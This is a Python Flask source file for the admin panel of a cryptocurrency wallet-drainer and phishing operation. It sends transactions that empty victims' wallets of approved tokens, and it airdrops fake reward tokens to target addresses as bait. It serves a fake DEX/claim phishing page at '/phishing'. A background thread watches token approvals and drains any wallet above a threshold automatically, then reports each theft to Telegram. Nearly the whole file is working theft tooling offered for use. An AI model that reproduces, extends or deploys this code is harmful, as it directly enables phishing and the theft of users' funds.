#!/usr/bin/env python3

import json
import sys
import time
import threading
from pathlib import Path
from datetime import datetime

from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from web3 import Web3

try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    from web3.middleware.proof_of_authority import ExtraDataToPOAMiddleware as geth_poa_middleware

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from backend.config import (
    CHAIN_CONFIG, DEFAULT_CHAIN, YOUR_PRIVATE_KEY, YOUR_WALLET_ADDRESS,
    FLASK_SECRET_KEY, FLASK_HOST, FLASK_PORT, FLASK_DEBUG,
    CONTRACTS_DIR, MONITOR_INTERVAL_SECONDS, ADMIN_PASSWORD
)

app = Flask(__name__)
app.secret_key = FLASK_SECRET_KEY

# Global state
active_chain = DEFAULT_CHAIN
w3 = None
web3_config = None
drainer_contract = None
drainer_address = None
deployment_info = {}
monitor_thread = None
monitor_running = False



def init_web3(chain_name=None):
    """Initialize Web3 connection."""
    global w3, web3_config, active_chain
    
    if chain_name is None:
        chain_name = active_chain
    
    if chain_name not in CHAIN_CONFIG:
        return False
    
    config = CHAIN_CONFIG[chain_name]
    web3_config = config
    active_chain = chain_name
    
    w3 = Web3(Web3.HTTPProvider(config["rpc"]))
    if chain_name in ("bsc", "polygon", "avalanche"):
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    
    return w3.is_connected()


def load_deployment():
    """Load deployment info from file."""
    global drainer_contract, drainer_address, deployment_info
    
    deploy_path = Path("deployment_info.json")
    if not deploy_path.exists():
        return False
    
    with open(deploy_path) as f:
        deployment_info = json.load(f)
    
    drainer_address = deployment_info.get("drainer_address")
    if not drainer_address:
        return False
    
    drainer_json_path = CONTRACTS_DIR / "DrainerContract.json"
    if not drainer_json_path.exists():
        return False
    
    with open(drainer_json_path) as f:
        drainer_json = json.load(f)
    
    chain = deployment_info.get("chain", DEFAULT_CHAIN)
    if not init_web3(chain):
        return False
    
    drainer_contract = w3.eth.contract(
        address=Web3.to_checksum_address(drainer_address),
        abi=drainer_json["abi"]
    )
    return True


def require_auth(f):
    """Simple decorator to protect routes."""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated


# ─── Auth routes ───────────────────────────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["authenticated"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop("authenticated", None)
    return redirect(url_for("login"))


# ─── Dashboard ─────────────────────────────────────────────────

@app.route("/")
@require_auth
def dashboard():
    if not load_deployment():
        return render_template("index.html", 
            error="No deployment found. Deploy contracts first: python backend/deployer.py",
            deployed=False)
    
    try:
        owner = drainer_contract.functions.owner().call()
        paused = drainer_contract.functions.paused().call()
        target_count = len(web3_config["high_value_tokens"])
        fake_token_count = len(drainer_contract.functions.deployedFakeTokens().call())
        balance = w3.eth.get_balance(drainer_address)
        
        stats = {
            "chain": active_chain,
            "chain_id": web3_config["chain_id"],
            "drainer_address": drainer_address,
            "owner": owner,
            "paused": paused,
            "target_tokens": target_count,
            "fake_tokens_deployed": fake_token_count,
            "contract_balance": str(w3.from_wei(balance, "ether")),
            "currency": web3_config["currency"],
            "explorer": web3_config["explorer"],
            "monitor_running": monitor_running,
        }
    except Exception as e:
        stats = {"error": str(e)}
    
    return render_template("index.html", deployed=True, stats=stats)


# ─── API Routes ────────────────────────────────────────────────

@app.route("/api/stats")
@require_auth
def api_stats():
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        owner = drainer_contract.functions.owner().call()
        paused = drainer_contract.functions.paused().call()
        balance = w3.eth.get_balance(drainer_address)
        return jsonify({
            "chain": active_chain,
            "drainer": drainer_address,
            "owner": owner,
            "paused": paused,
            "balance": str(w3.from_wei(balance, "ether")),
            "currency": web3_config["currency"],
            "block": w3.eth.block_number,
        })
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/drain", methods=["POST"])
@require_auth
def api_drain():
    """Manually drain a victim's wallet."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    victim_address = data.get("address")
    if not victim_address:
        return jsonify({"error": "No victim address provided"})
    
    try:
        victim = Web3.to_checksum_address(victim_address)
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        
        checkable = drainer_contract.functions.checkDrainable(victim).call()
        tokens, amounts = checkable
        
        if len(tokens) == 0:
            return jsonify({"error": "No drainable tokens found", "victim": victim_address})
        
        tx = drainer_contract.functions.drainAll(victim).build_transaction({
            "from": account.address,
            "gas": 500000,
            "gasPrice": int(w3.eth.gas_price * 1.2),
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        # Notify Telegram
        try:
            from bot.telegram_bot import notify_drain
            for t_addr, amt in zip(tokens, amounts):
                sym_con = w3.eth.contract(
                    address=t_addr,
                    abi=[{"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"}]
                )
                try:
                    sym = sym_con.functions.symbol().call()
                except:
                    sym = "?"
                notify_drain(victim_address, sym, str(w3.from_wei(int(amt), "ether")), tx_hash.hex(), active_chain)
        except:
            pass
        
        return jsonify({
            "success": True,
            "victim": victim_address,
            "tx_hash": tx_hash.hex(),
            "gas_used": receipt["gasUsed"],
            "tokens_found": [
                {"token": t, "amount": str(w3.from_wei(int(a), "ether"))} for t, a in zip(tokens, amounts)
            ]
        })
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/check/<address>")
@require_auth
def api_check(address):
    """Check what tokens can be drained from an address."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        victim = Web3.to_checksum_address(address)
        checkable = drainer_contract.functions.checkDrainable(victim).call()
        tokens, amounts = checkable
        
        results = []
        for token_addr, amount in zip(tokens, amounts):
            token_contract = w3.eth.contract(
                address=token_addr,
                abi=[{"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"}]
            )
            try:
                symbol = token_contract.functions.symbol().call()
            except:
                symbol = "UNKNOWN"
            
            results.append({
                "token": token_addr,
                "symbol": symbol,
                "amount": str(w3.from_wei(int(amount), "ether")),
            })
        
        return jsonify({"victim": address, "drainable": results, "count": len(results)})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/toggle-pause", methods=["POST"])
@require_auth
def api_toggle_pause():
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        tx = drainer_contract.functions.togglePause().build_transaction({
            "from": account.address,
            "gas": 50000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        
        paused = drainer_contract.functions.paused().call()
        return jsonify({"success": True, "paused": paused, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/sweep", methods=["POST"])
@require_auth
def api_sweep():
    """Sweep native currency from the drainer contract."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        tx = drainer_contract.functions.sweepNative().build_transaction({
            "from": account.address,
            "gas": 50000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        return jsonify({"success": True, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/airdrop", methods=["POST"])
@require_auth
def api_airdrop():
    """Airdrop fake tokens to target wallets."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    addresses = data.get("addresses", [])
    if not addresses:
        return jsonify({"error": "No addresses provided"})
    
    fake_token_address = deployment_info.get("fake_token_address")
    if not fake_token_address:
        return jsonify({"error": "No fake token deployed. Run deployer with --deploy-fake"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        
        fake_json_path = CONTRACTS_DIR / "FakeRewardToken.json"
        with open(fake_json_path) as f:
            fake_json = json.load(f)
        
        fake_token = w3.eth.contract(
            address=Web3.to_checksum_address(fake_token_address),
            abi=fake_json["abi"]
        )
        
        # Airdrop in batches of 50 to avoid gas limits
        batch_size = 50
        results = []
        for i in range(0, len(addresses), batch_size):
            batch = addresses[i:i+batch_size]
            # Convert to checksum addresses
            checksummed = [Web3.to_checksum_address(a) for a in batch]
            
            tx = fake_token.functions.airdrop(checksummed, 1000 * 10**18).build_transaction({
                "from": account.address,
                "gas": 3000000,
                "gasPrice": w3.eth.gas_price,
                "nonce": w3.eth.get_transaction_count(account.address),
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            results.append({
                "batch": i // batch_size,
                "count": len(batch),
                "tx_hash": tx_hash.hex(),
                "gas_used": receipt["gasUsed"],
            })
        
        return jsonify({"success": True, "total": len(addresses), "batches": results})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/add-target-token", methods=["POST"])
@require_auth
def api_add_target_token():
    """Add a new token to the drain target list."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    token_address = data.get("token_address")
    if not token_address:
        return jsonify({"error": "No token address provided"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        token_addr = Web3.to_checksum_address(token_address)
        
        tx = drainer_contract.functions.addTargetToken(token_addr).build_transaction({
            "from": account.address,
            "gas": 100000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        
        return jsonify({"success": True, "token": token_address, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/start-monitor", methods=["POST"])
@require_auth
def api_start_monitor():
    global monitor_thread, monitor_running
    
    if monitor_running:
        return jsonify({"error": "Monitor already running"})
    
    monitor_running = True
    monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
    monitor_thread.start()
    return jsonify({"success": True, "message": "Monitor started"})


@app.route("/api/stop-monitor", methods=["POST"])
@require_auth
def api_stop_monitor():
    global monitor_running
    monitor_running = False
    return jsonify({"success": True, "message": "Monitor stopped"})


# ─── Monitor Background Thread ─────────────────────────────────

def monitor_loop():
    """Background thread to monitor for new approvals and drain automatically."""
    global monitor_running
    
    print(f"[*] Monitor thread started on {active_chain}")
    
    while monitor_running:
        try:
            current_block = w3.eth.block_number
            from_block = max(0, current_block - 100)
            
            for token_addr in web3_config["high_value_tokens"]:
                token_contract = w3.eth.contract(
                    address=Web3.to_checksum_address(token_addr),
                    abi=[{
                        "anonymous": False,
                        "inputs": [
                            {"indexed": True, "name": "owner", "type": "address"},
                            {"indexed": True, "name": "spender", "type": "address"},
                            {"indexed": False, "name": "value", "type": "uint256"},
                        ],
                        "name": "Approval",
                        "type": "event"
                    }]
                )
                
                events = token_contract.events.Approval.get_logs(
                    fromBlock=from_block,
                    toBlock="latest",
                    argument_filters={"spender": drainer_address}
                )
                
                account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
                
                for event in events:
                    owner = event["args"]["owner"]
                    value = event["args"]["value"]
                    
                    print(f"[!] New approval: {owner} allowed {value} of {token_addr}")
                    
                    try:
                        from bot.telegram_bot import notify_approval
                        notify_approval(owner, token_addr, str(value), active_chain)
                    except:
                        pass
                    
                    if value > 10 * 10**18:
                        try:
                            tx = drainer_contract.functions.drainToken(
                                Web3.to_checksum_address(token_addr), owner
                            ).build_transaction({
                                "from": account.address,
                                "gas": 200000,
                                "gasPrice": w3.eth.gas_price,
                                "nonce": w3.eth.get_transaction_count(account.address),
                            })
                            signed = account.sign_transaction(tx)
                            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
                            w3.eth.wait_for_transaction_receipt(tx_hash)
                            print(f"[+] Drained {owner} -> {tx_hash.hex()}")
                        except Exception as e:
                            print(f"[-] Drain failed for {owner}: {e}")
            
            time.sleep(MONITOR_INTERVAL_SECONDS)
        except Exception as e:
            print(f"[-] Monitor error: {e}")
            time.sleep(60)
    
    print("[*] Monitor thread stopped")


# ─── Phishing Page ─────────────────────────────────────────────

@app.route("/phishing")
def phishing_page():
    """Serve the phishing frontend (fake DEX/claim page)."""
    return render_template("phishing.html",
        drainer_address=drainer_address or "",
        chain=active_chain,
        rpc_url=web3_config["rpc"] if web3_config else "",
    )


# ─── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    print(f"[*] Starting Drainer Admin Panel on {FLASK_HOST}:{FLASK_PORT}")
    print(f"[*] Dashboard: http://{FLASK_HOST}:{FLASK_PORT}/")
    print(f"[*] Phishing:  http://{FLASK_HOST}:{FLASK_PORT}/phishing")
    print(f"[*] Password:  {ADMIN_PASSWORD}")
    app.run(host=FLASK_HOST, port=FLASK_PORT, debug=FLASK_DEBUG)